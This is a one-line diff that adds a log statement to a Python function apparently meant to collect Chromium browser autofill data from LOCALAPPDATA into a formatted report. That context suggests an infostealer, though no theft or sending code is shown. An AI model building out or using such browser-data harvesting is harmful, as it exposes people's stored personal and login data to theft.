@@ -314,6 +314,7 @@ def Chromium():
     global autofills
     global listData
 
+    Log("===========Chromium===========")
     listData.append("\n**🌐Browsers🌐**")
 
     local = os.getenv('LOCALAPPDATA')
